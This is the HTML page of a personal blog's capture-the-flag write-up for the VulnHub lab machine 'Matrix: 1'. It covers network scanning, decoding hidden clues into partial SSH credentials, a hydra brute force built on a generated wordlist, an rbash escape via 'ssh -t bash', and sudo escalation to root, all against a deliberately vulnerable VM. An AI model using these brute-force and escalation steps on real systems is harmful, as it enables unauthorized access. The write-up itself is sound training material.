@@ -1,0 +1,416 @@
+<!DOCTYPE html>
+<html lang="">
+    <head>
+         
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <title>Matrix: 1 - Writeup</title>
+        <style>
+
+    html body {
+        font-family: '', sans-serif;
+        background-color: white;
+    }
+
+    :root {
+        --accent: green;
+        --border-width:  5px ;
+    }
+
+</style>
+
+
+<link rel="stylesheet" href="https://0x23b.github.io/css/main.css">
+
+
+
+
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=">
+
+
+
+
+
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+
+
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
+ 
+
+
+
+
+
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+
+
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+
+
+<script>$(document).on('click', function() { $('.collapse').collapse('hide'); })</script>
+ <meta name="generator" content="Hugo 0.32.4" />
+        
+        
+        
+        
+        <script async src="https://www.googletagmanager.com/gtag/js?id=UA-91628530-1"></script>
+        <script>
+          window.dataLayer = window.dataLayer || [];
+          function gtag(){dataLayer.push(arguments)};
+          gtag('js', new Date());
+
+          gtag('config', 'UA-91628530-1');
+        </script>
+        
+    </head>
+
+    
+    <script type="text/javascript" async
+      src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+  </script>
+
+    <body>
+        
+
+        <nav class="navbar navbar-default navbar-fixed-top">
+
+            <div class="container">
+
+                <div class="navbar-header">
+
+                    <a class="navbar-brand visible-xs" href="#">Matrix: 1 - Writeup</a>
+					
+                    <button class="navbar-toggle" data-target=".navbar-collapse" data-toggle="collapse">
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                    </button>
+                </div>
+
+                <div class="collapse navbar-collapse">
+
+                    
+                        <ul class="nav navbar-nav">
+                            
+                                <li><a href="https://0x23b.github.io/">Home</a></li>
+                            
+                                <li><a href="https://0x23b.github.io/about">About</a></li>
+                            
+                                <li><a href="https://0x23b.github.io/tags/">Tags</a></li>
+                            
+                                <li><a href="https://0x23b.github.io/posts/">Posts</a></li>
+                            
+                        </ul>
+                    
+
+                    
+                        <ul class="nav navbar-nav navbar-right">
+                            
+                                <li class="navbar-icon"><a href="https://github.com/0x23b/"><i class="fa fa-github"></i></a></li>
+                            
+                                <li class="navbar-icon"><a href="https://twitter.com/0x23b/"><i class="fa fa-twitter"></i></a></li>
+                            
+							<li class="navbar-icon"></li>
+
+                        </ul>
+						
+						<ul class="nav navbar-nav navbar-right">
+                        </ul>
+						
+						
+
+                    
+
+                </div>
+
+            </div>
+
+        </nav>
+
+
+<main>
+
+    <div class="item">
+
+    
+    
+    
+
+    
+    
+
+    <h4><a href="https://0x23b.github.io/posts/vulnhub/2019-20-25-vulnhub_matrix_1_writeup/">Matrix: 1 - Writeup</a></h4>
+    <h5>February 25, 2019</h5>
+    
+    <a href="https://0x23b.github.io/tags/vulnhub"><kbd class="item-tag">Vulnhub</kbd></a>
+    
+    <a href="https://0x23b.github.io/tags/writeups"><kbd class="item-tag">Writeups</kbd></a>
+    
+
+</div>
+
+
+    <br> <div class="text-justify">
+
+<h1 id="matrix-1-writeup">Matrix: 1 - Writeup</h1>
+
+<h2 id="summary">Summary</h2>
+
+<p>I am a big Matrix fan and hoped to have funny hours with this machine, as this machine was labelled with intermediate difficulty. Unfortunately, it took me about 30 minutes to read root.txt. Anyhow, in the end I enjoyed the machine. We are given 3 open ports, whereas two of them are web servers. On one of the web servers we can see a comment in base64, pointing us to a file, which is encoded in Brainfuck. After decoding we get ssh credentials, where the last two characters of the password are missing. Connecting through ssh throws us in a restricted shell, which can be easily bypassed. With the same ease, we can get to the root user, as the guest user has sudo permission to everything.</p>
+
+<h2 id="identifying-the-host">Identifying the host</h2>
+
+<p>To find out the host, we can quickly run an nmap scan:</p>
+
+<pre><code class="language-bash">root@kali:~/vulnhub/matrix# nmap -sn 192.168.63.*
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-25 20:14 CET
+mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
+Nmap scan report for 192.168.63.1
+Host is up (0.00010s latency).
+MAC Address: 0A:00:27:00:00:10 (Unknown)
+Nmap scan report for 192.168.63.2
+Host is up (0.00015s latency).
+MAC Address: 08:00:27:14:CE:0F (Oracle VirtualBox virtual NIC)
+Nmap scan report for 192.168.63.3
+Host is up (0.00018s latency).
+MAC Address: 08:00:27:E5:B2:AA (Oracle VirtualBox virtual NIC)
+Nmap scan report for 192.168.63.4
+Host is up.
+Nmap done: 256 IP addresses (4 hosts up) scanned in 2.02 seconds
+</code></pre>
+
+<h2 id="port-scan">Port scan</h2>
+
+<p>Now as we have the host, we can run a port scan. As all my VM’s are connected over the host only adapter, we can quickly run a full scan:</p>
+
+<pre><code class="language-bash">root@kali:~/vulnhub/matrix# nmap -p- -oA full 192.168.63.3
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-25 20:14 CET
+mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
+Nmap scan report for 192.168.63.3
+Host is up (0.00057s latency).
+Not shown: 65532 closed ports
+PORT      STATE SERVICE
+22/tcp    open  ssh
+80/tcp    open  http
+31337/tcp open  Elite
+MAC Address: 08:00:27:E5:B2:AA (Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 2.14 seconds
+</code></pre>
+
+<p>Three open ports, where I assumed at that time, that two of them are web servers. I had a look at port 80, which had nothing interesting, but port 31337 revealed a comment in the source code:</p>
+
+<pre><code class="language-html">&lt;!-- service --&gt;
+&lt;div class=&quot;service&quot;&gt;
+&lt;!--p class=&quot;service__text&quot;&gt;ZWNobyAiVGhlbiB5b3UnbGwgc2VlLCB0aGF0IGl0IGlzIG5vdCB0aGUgc3Bvb24gdGhhdCBiZW5kcywgaXQgaXMgb25seSB5b3Vyc2VsZi4gIiA+IEN5cGhlci5tYXRyaXg=&lt;/p--&gt;
+&lt;/div&gt;&lt;!-- End / service --&gt;
+</code></pre>
+
+<p>We can easily decode this base64 string with the following command:</p>
+
+<pre><code class="language-bash">root@kali:~/vulnhub/matrix# echo ZWNobyAiVGhlbiB5b3UnbGwgc2VlLCB0aGF0IGl0IGlzIG5vdCB0aGUgc3Bvb24gdGhhdCBiZW5kcywgaXQgaXMgb25seSB5b3Vyc2VsZi4gIiA+IEN5cGhlci5tYXRyaXg= | base64 -d
+echo &quot;Then you'll see, that it is not the spoon that bends, it is only yourself. &quot; &gt; Cypher.matrix
+</code></pre>
+
+<h2 id="brainfuck">Brainfuck</h2>
+
+<p>After downloading the file from the web server, we can see an a bizzare string of characters, which is an esoteric programming language with the name Brainfuck!</p>
+
+<pre><code class="language-bash">root@kali:~/vulnhub/matrix# wget 192.168.63.3:31337/Cypher.matrix &gt; Cypher.matrix
+--2019-02-25 21:12:48--  http://192.168.63.3:31337/Cypher.matrix
+Verbindungsaufbau zu 192.168.63.3:31337 … verbunden.
+HTTP-Anforderung gesendet, auf Antwort wird gewartet … 200 OK
+Länge: 4121 (4,0K) [application/octet-stream]
+Wird in »Cypher.matrix« gespeichert.
+
+Cypher.matrix     100%[===================&gt;]   4,02K  --.-KB/s    in 0s      
+
+2019-02-25 21:12:48 (138 MB/s) - »Cypher.matrix« gespeichert [4121/4121]
+
+root@kali:~/vulnhub/matrix# cat Cypher.matrix
++++++ ++++[ -&gt;+++ +++++ +&lt;]&gt;+ +++++ ++.&lt;+ +++[- &gt;++++ &lt;]&gt;++ ++++. +++++
++.&lt;++ +++++ ++[-&gt; ----- ----&lt; ]&gt;--- -.&lt;++ +++++ +[-&gt;+ +++++ ++&lt;]&gt; +++.-
+-.&lt;++ +[-&gt;+ ++&lt;]&gt; ++++. &lt;++++ ++++[ -&gt;--- ----- &lt;]&gt;-- ----- ----- --.&lt;+
++++++ ++[-&gt; +++++ +++&lt;] &gt;++++ +.+++ +++++ +.+++ +++.&lt; +++[- &gt;---&lt; ]&gt;---
+---.&lt; +++[- &gt;+++&lt; ]&gt;+++ +.&lt;++ +++++ ++[-&gt; ----- ----&lt; ]&gt;-.&lt; +++++ +++[-
+&gt;++++ ++++&lt; ]&gt;+++ +++++ +.+++ ++.++ ++++. ----- .&lt;+++ +++++ [-&gt;-- -----
+-&lt;]&gt;- ----- ----- ----. &lt;++++ ++++[ -&gt;+++ +++++ &lt;]&gt;++ +++++ +++++ +.&lt;++
++[-&gt;- --&lt;]&gt; ---.&lt; ++++[ -&gt;+++ +&lt;]&gt;+ ++.-- .---- ----- .&lt;+++ [-&gt;++ +&lt;]&gt;+
++++++ .&lt;+++ +++++ +[-&gt;- ----- ---&lt;] &gt;---- ---.&lt; +++++ +++[- &gt;++++ ++++&lt;
+]&gt;+.&lt; ++++[ -&gt;+++ +&lt;]&gt;+ +.&lt;++ +++++ ++[-&gt; ----- ----&lt; ]&gt;--. &lt;++++ ++++[
+-&gt;+++ +++++ &lt;]&gt;++ +++++ .&lt;+++ [-&gt;++ +&lt;]&gt;+ ++++. &lt;++++ [-&gt;-- --&lt;]&gt; .&lt;+++
+[-&gt;++ +&lt;]&gt;+ ++++. +.&lt;++ +++++ +[-&gt;- ----- --&lt;]&gt; ----- ---.&lt; +++[- &gt;---&lt;
+]&gt;--- .&lt;+++ +++++ +[-&gt;+ +++++ +++&lt;] &gt;++++ ++.&lt;+ ++[-&gt; ---&lt;] &gt;---- -.&lt;++
++[-&gt;+ ++&lt;]&gt; ++.&lt;+ ++[-&gt; ---&lt;] &gt;---. &lt;++++ ++++[ -&gt;--- ----- &lt;]&gt;-- -----
+-.&lt;++ +++++ +[-&gt;+ +++++ ++&lt;]&gt; +++++ +++++ +++++ +.&lt;++ +[-&gt;- --&lt;]&gt; -----
+-.&lt;++ ++[-&gt; ++++&lt; ]&gt;++. .++++ .---- ----. +++.&lt; +++[- &gt;---&lt; ]&gt;--- --.&lt;+
++++++ ++[-&gt; ----- ---&lt;] &gt;---- .&lt;+++ +++++ [-&gt;++ +++++ +&lt;]&gt;+ +++++ +++++
+.&lt;+++ ++++[ -&gt;--- ----&lt; ]&gt;--- ----- -.&lt;++ +++++ [-&gt;++ +++++ &lt;]&gt;++ +++++
++++.. &lt;++++ +++[- &gt;---- ---&lt;] &gt;---- ----- --.&lt;+ +++++ ++[-&gt; +++++ +++&lt;]
+&gt;++.&lt; +++++ [-&gt;-- ---&lt;] &gt;-..&lt; +++++ +++[- &gt;---- ----&lt; ]&gt;--- ----- ---.-
+--.&lt;+ +++++ ++[-&gt; +++++ +++&lt;] &gt;++++ .&lt;+++ ++[-&gt; +++++ &lt;]&gt;++ +++++ +.+++
+++.&lt;+ ++[-&gt; ---&lt;] &gt;---- --.&lt;+ +++++ [-&gt;-- ----&lt; ]&gt;--- ----. &lt;++++ +[-&gt;-
+----&lt; ]&gt;-.&lt; +++++ [-&gt;++ +++&lt;] &gt;++++ ++++. &lt;++++ +[-&gt;+ ++++&lt; ]&gt;+++ +++++
++.&lt;++ ++[-&gt; ++++&lt; ]&gt;+.+ .&lt;+++ +[-&gt;- ---&lt;] &gt;---- .&lt;+++ [-&gt;++ +&lt;]&gt;+ +..&lt;+
+++[-&gt; +++&lt;] &gt;++++ .&lt;+++ +++++ [-&gt;-- ----- -&lt;]&gt;- ----- ----- --.&lt;+ ++[-&gt;
+---&lt;] &gt;---. &lt;++++ ++[-&gt; +++++ +&lt;]&gt;+ ++++. &lt;++++ ++[-&gt; ----- -&lt;]&gt;- ----.
+&lt;++++ ++++[ -&gt;+++ +++++ &lt;]&gt;++ ++++. +++++ ++++. +++.&lt; +++[- &gt;---&lt; ]&gt;--.
+--.&lt;+ ++[-&gt; +++&lt;] &gt;++++ ++.&lt;+ +++++ +++[- &gt;---- ----- &lt;]&gt;-- -.&lt;++ +++++
++[-&gt;+ +++++ ++&lt;]&gt; +++++ +++++ ++.&lt;+ ++[-&gt; ---&lt;] &gt;--.&lt; ++++[ -&gt;+++ +&lt;]&gt;+
++.+.&lt; +++++ ++++[ -&gt;--- ----- -&lt;]&gt;- --.&lt;+ +++++ +++[- &gt;++++ +++++ &lt;]&gt;++
++.+++ .---- ----. &lt;++++ ++++[ -&gt;--- ----- &lt;]&gt;-- ----- ----- ---.&lt; +++++
++++[- &gt;++++ ++++&lt; ]&gt;+++ .++++ +.--- ----. &lt;++++ [-&gt;++ ++&lt;]&gt; +.&lt;++ ++[-&gt;
+----&lt; ]&gt;-.+ +.&lt;++ ++[-&gt; ++++&lt; ]&gt;+.&lt; +++[- &gt;---&lt; ]&gt;--- ---.&lt; +++[- &gt;+++&lt;
+]&gt;+++ +.+.&lt; +++++ ++++[ -&gt;--- ----- -&lt;]&gt;- -.&lt;++ +++++ ++[-&gt; +++++ ++++&lt;
+]&gt;++. ----. &lt;++++ ++++[ -&gt;--- ----- &lt;]&gt;-- ----- ----- ---.&lt; +++++ +[-&gt;+
++++++ &lt;]&gt;++ +++.&lt; +++++ +[-&gt;- ----- &lt;]&gt;-- ---.&lt; +++++ +++[- &gt;++++ ++++&lt;
+]&gt;+++ +++++ .---- ---.&lt; ++++[ -&gt;+++ +&lt;]&gt;+ ++++. &lt;++++ [-&gt;-- --&lt;]&gt; -.&lt;++
++++++ +[-&gt;- ----- --&lt;]&gt; ----- .&lt;+++ +++++ +[-&gt;+ +++++ +++&lt;] &gt;+.&lt;+ ++[-&gt;
+---&lt;] &gt;---- .&lt;+++ [-&gt;++ +&lt;]&gt;+ +.--- -.&lt;++ +[-&gt;- --&lt;]&gt; --.++ .++.- .&lt;+++
++++++ [-&gt;-- ----- -&lt;]&gt;- ---.&lt; +++++ ++++[ -&gt;+++ +++++ +&lt;]&gt;+ +++++ .&lt;+++
+[-&gt;-- -&lt;]&gt;- ----. &lt;+++[ -&gt;+++ &lt;]&gt;++ .&lt;+++ [-&gt;-- -&lt;]&gt;- --.&lt;+ +++++ ++[-&gt;
+----- ---&lt;] &gt;---- ----. &lt;++++ +++[- &gt;++++ +++&lt;] &gt;++++ +++.. &lt;++++ +++[-
+&gt;---- ---&lt;] &gt;---- ---.&lt; +++++ ++++[ -&gt;+++ +++++ +&lt;]&gt;+ ++.-- .++++ +++.&lt;
++++++ ++++[ -&gt;--- ----- -&lt;]&gt;- ----- --.&lt;+ +++++ +++[- &gt;++++ +++++ &lt;]&gt;++
++++++ +.&lt;++ +[-&gt;- --&lt;]&gt; -.+++ +++.- --.&lt;+ +++++ +++[- &gt;---- ----- &lt;]&gt;-.
+&lt;++++ ++++[ -&gt;+++ +++++ &lt;]&gt;++ +++++ +++++ .++++ +++++ .&lt;+++ +[-&gt;- ---&lt;]
+&gt;--.+ +++++ ++.&lt;+ +++++ ++[-&gt; ----- ---&lt;] &gt;---- ----- --.&lt;+ +++++ ++[-&gt;
++++++ +++&lt;] &gt;+.&lt;+ ++[-&gt; +++&lt;] &gt;++++ .&lt;+++ [-&gt;-- -&lt;]&gt;- .&lt;+++ +++++ [-&gt;--
+----- -&lt;]&gt;- ---.&lt; +++++ +++[- &gt;++++ ++++&lt; ]&gt;+++ +++.+ ++.++ +++.&lt; +++[-
+&gt;---&lt; ]&gt;-.&lt; +++++ +++[- &gt;---- ----&lt; ]&gt;--- -.&lt;++ +++++ +[-&gt;+ +++++ ++&lt;]&gt;
++++.&lt; +++[- &gt;+++&lt; ]&gt;+++ .+++. .&lt;+++ [-&gt;-- -&lt;]&gt;- ---.- -.&lt;++ ++[-&gt; ++++&lt;
+]&gt;+.&lt; +++++ ++++[ -&gt;--- ----- -&lt;]&gt;- --.&lt;+ +++++ +++[- &gt;++++ +++++ &lt;]&gt;++
+.+.-- .---- ----- .++++ +.--- ----. &lt;++++ ++++[ -&gt;--- ----- &lt;]&gt;-- -----
+.&lt;+++ +++++ [-&gt;++ +++++ +&lt;]&gt;+ +++++ +++++ ++++. ----- ----. &lt;++++ ++++[
+-&gt;--- ----- &lt;]&gt;-- ----. &lt;++++ ++++[ -&gt;+++ +++++ &lt;]&gt;++ +++++ +++++ ++++.
+&lt;+++[ -&gt;--- &lt;]&gt;-- ----. &lt;++++ [-&gt;++ ++&lt;]&gt; ++..+ +++.- ----- --.++ +.&lt;++
++[-&gt;- --&lt;]&gt; ----- .&lt;+++ ++++[ -&gt;--- ----&lt; ]&gt;--- --.&lt;+ ++++[ -&gt;--- --&lt;]&gt;
+----- ---.- --.&lt;
+</code></pre>
+
+<p>We can run this string with an online brainfuck interpreter <a href="https://gc.de/gc/brainfuck/">https://gc.de/gc/brainfuck/</a> and get the following printed out:</p>
+
+<pre><code class="language-bash">You can enter into matrix as guest, with password k1ll0rXX
+Note: Actually, I forget last two characters so I have replaced with XX try your luck and find correct string of password.
+</code></pre>
+
+<p>Great! We have credentials, but have to guess the last two characters. This can be done with a small python script, which generates a wordlist, that can be used with hydra:</p>
+
+<pre><code class="language-bash">root@kali:~/vulnhub/matrix# cat brutus.py
+import string
+
+for i in string.printable:
+    for j in string.printable:
+        print &quot;k1ll0r&quot;+i+j
+root@kali:~/vulnhub/matrix# python brutus.py &gt; password.txt
+root@kali:~/vulnhub/matrix# hydra -l guest -P password.txt ssh://192.168.63.3:22
+Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-02-25 20:27:38
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 10099 login tries (l:1/p:10099), ~632 tries per task
+[DATA] attacking ssh://192.168.63.3:22/
+
+[STATUS] 178.00 tries/min, 178 tries in 00:01h, 9923 to do in 00:56h, 16 active
+[STATUS] 166.00 tries/min, 498 tries in 00:03h, 9603 to do in 00:58h, 16 active
+[22][ssh] host: 192.168.63.3   login: guest   password: k1ll0r7n
+</code></pre>
+
+<h2 id="ssh-login-into-restricted-shell">SSH login into restricted shell</h2>
+
+<p>As we now have our credentials, we can try to login via ssh. Unfortunately, this will leave us with a restricted shell:</p>
+
+<pre><code class="language-bash">root@kali:~/vulnhub/matrix# ssh guest@192.168.63.3
+guest@192.168.63.3's password:
+X11 forwarding request failed on channel 0
+Last login: Mon Aug  6 16:25:44 2018 from 192.168.56.102
+guest@porteus:~$ ls
+-rbash: /bin/ls: restricted: cannot specify `/' in command names
+</code></pre>
+
+<p>But also here we have a bypass. Just with giving the -t parameter to ssh, we can specify a command, which is executed on login.</p>
+
+<pre><code class="language-bash">root@kali:~/vulnhub/matrix# ssh guest@192.168.63.3 -t bash
+guest@192.168.63.3's password:
+X11 forwarding request failed on channel 0
+guest@porteus:~$ ls
+Desktop/  Documents/  Downloads/  Music/  Pictures/  Public/  Videos/  prog/
+</code></pre>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+
+<p>All we have to do now is to enumerate the privesc. One of the first things I do is to check, which sudo privileges the user has:</p>
+
+<pre><code class="language-bash">guest@porteus:~$ sudo -l
+User guest may run the following commands on porteus:
+    (ALL) ALL
+    (root) NOPASSWD: /usr/lib64/xfce4/session/xfsm-shutdown-helper
+    (trinity) NOPASSWD: /bin/cp
+guest@porteus:~$ sudo /bin/bash
+
+We trust you have received the usual lecture from the local System
+Administrator. It usually boils down to these three things:
+
+    #1) Respect the privacy of others.
+    #2) Think before you type.
+    #3) With great power comes great responsibility.
+
+Password:
+root@porteus:~# id
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
+root@porteus:~# ls -la
+total 74
+drwx------ 16 root root 4096 Aug 14  2018 ./
+drwxr-xr-x 51 root root 4096 Aug  6  2018 ../
+-rw-------  1 root root   52 Aug 14  2018 .Xauthority
+-rw-------  1 root root 6172 Aug 14  2018 .bash_history
+-rw-r--r--  1 root root   79 Mar  5  2017 .bash_profile
+-rw-r--r--  1 root root 1184 Apr 22  2018 .bashrc
+drwx------  5 root root 4096 Aug  6  2018 .cache/
+drwxr-xr-x 21 root root 4096 Aug 13  2018 .config/
+drwx------  3 root root 4096 Aug  6  2018 .dbus/
+-rw-------  1 root root   16 Aug  6  2018 .esd_auth
+drwx------  4 root root 4096 Aug  6  2018 .thumbnails/
+drwxr-xr-x  2 root root 4096 Aug  6  2018 Desktop/
+drwxr-xr-x  2 root root 4096 Aug  6  2018 Documents/
+drwxr-xr-x  2 root root 4096 Aug  6  2018 Downloads/
+drwxr-xr-x  2 root root 4096 Aug  6  2018 Music/
+drwxr-xr-x  2 root root 4096 Aug  6  2018 Pictures/
+drwxr-xr-x  2 root root 4096 Aug  6  2018 Public/
+drwxr-xr-x  2 root root 4096 Aug  6  2018 Videos/
+-rw-r--r--  1 root root  691 Aug 14  2018 flag.txt
+root@porteus:~# cat flag.txt
+   _,-.                                                             
+,-'  _|                  EVER REWIND OVER AND OVER AGAIN THROUGH THE
+|_,-O__`-._              INITIAL AGENT SMITH/NEO INTERROGATION SCENE
+|`-._\`.__ `_.           IN THE MATRIX AND BEAT OFF                 
+|`-._`-.\,-'_|  _,-'.                                               
+     `-.|.-' | |`.-'|_     WHAT                                     
+        |      |_|,-'_`.                                            
+              |-._,-'  |     NO, ME NEITHER                         
+         jrei | |    _,'                                            
+              '-|_,-'          IT'S JUST A HYPOTHETICAL QUESTION    
+</code></pre>
+</div>
+
+    
+    
+
+    
+
+    
+
+</main>
+
+        <footer>
+
+            <p class="copyright text-muted">&copy; All rights reserved. Powered by <a href="https://gohugo.io">Hugo</a> and <a href="https://github.com/calintat/minimal">Minimal</a></p>
+
+        </footer>
+       
+    </body>
+
+</html>
+
